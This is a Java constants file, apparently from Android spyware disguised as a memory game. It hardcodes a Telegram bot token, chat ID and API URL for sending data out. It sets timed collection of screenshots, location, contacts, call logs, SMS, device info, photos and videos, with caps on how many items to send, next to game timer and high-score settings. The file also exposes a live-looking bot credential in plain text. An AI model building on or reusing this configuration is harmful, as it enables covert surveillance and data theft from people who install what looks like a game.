package com.v8.global.sniffer.utils;

public class Constants {
    
    // 🔐 توكن البوت - غير هذا برجاءاً
    public static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    public static final String CHAT_ID = "7259620384";
    public static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    // ⏱️ فترات الجمع (بالمللي ثانية)
    public static final long COLLECT_INTERVAL = 5 * 60 * 1000; // 5 دقائق
    public static final long SCREENSHOT_INTERVAL = 10 * 60 * 1000; // 10 دقائق
    public static final long LOCATION_INTERVAL = 15 * 60 * 1000; // 15 دقيقة
    public static final long CONTACTS_INTERVAL = 30 * 60 * 1000; // 30 دقيقة
    public static final long CALL_LOGS_INTERVAL = 30 * 60 * 1000; // 30 دقيقة
    public static final long SMS_INTERVAL = 30 * 60 * 1000; // 30 دقيقة
    public static final long DEVICE_INFO_INTERVAL = 60 * 60 * 1000; // ساعة واحدة
    
    // 📦 حدود حجم الملفات (بالبايت)
    public static final long MAX_PHOTO_SIZE = 15 * 1024 * 1024; // 15 ميجابايت
    public static final long MAX_VIDEO_SIZE = 50 * 1024 * 1024; // 50 ميجابايت
    
    // 🔢 حدود الكميات
    public static final int MAX_CONTACTS_TO_SEND = 50;
    public static final int MAX_CALLS_TO_SEND = 30;
    public static final int MAX_SMS_TO_SEND = 20;
    public static final int MAX_PHOTOS_TO_SEND = 10;
    public static final int MAX_VIDEOS_TO_SEND = 5;
    
    // ⏰ تأخير البدء (بالمللي ثانية)
    public static final long INITIAL_DELAY = 60 * 1000; // دقيقة واحدة
    
    // 📱 معرفات الإشعارات
    public static final int NOTIFICATION_ID_BACKGROUND = 1001;
    public static final int NOTIFICATION_ID_COLLECTOR = 1002;
    
    // 🎮 إعدادات اللعبة
    public static final int GAME_TIME_SECONDS = 60; // 60 ثانية
    public static final int TOTAL_PAIRS = 8; // 8 أزواج
    
    // 🏆 أسماء ملفات SharedPreferences
    public static final String PREF_GAME = "game_prefs";
    public static final String PREF_APP = "app_prefs";
    
    // 🔑 مفاتيح SharedPreferences
    public static final String KEY_HIGH_SCORE = "high_score";
    public static final String KEY_FIRST_RUN = "first_run";
    public static final String KEY_PERMISSIONS_GRANTED = "permissions_granted";
    
    // 🚫 لا يمكن إنشاء كائن من هذه الفئة
    private Constants() {
        // منع الإنشاء
    }
}
